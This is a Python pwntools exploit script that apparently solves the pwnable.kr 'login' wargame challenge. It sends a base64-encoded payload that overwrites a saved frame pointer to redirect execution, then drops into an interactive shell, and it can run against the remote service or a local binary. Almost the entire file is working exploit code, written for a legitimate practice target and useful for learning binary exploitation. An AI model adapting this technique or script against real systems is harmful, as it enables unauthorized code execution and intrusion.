from pwn import *
import sys

context(os="linux", arch="i386")
context.log_level = 'debug'

if len(sys.argv) != 2:
    exit()

"""
exploit
"""

if sys.argv[1] == "remote":
    p = remote("pwnable.kr", 9003)
elif sys.argv[1] == "local":
    p = process("login")

context.log_level = 'debug'
context(os="linux", arch="i386")

"""
>>> s = struct.pack("I", 0x8049278) + "AAAA" + struct.pack("I", 0x0811eb40-0x4)
>>> s
'x\x92\x04\x08AAAA<\xeb\x11\x08'
>>> s.encode("base64")
'eJIECEFBQUE86xEI\n'
>>> 
"""
s = struct.pack("I", 0x8049278) + "AAAA" + struct.pack("I", 0x0811eb40-0x4)
s = s.encode("base64")
p.recvuntil(": ")
p.sendline(s)
print(p.recvuntil("good!\n"))
p.interactive()
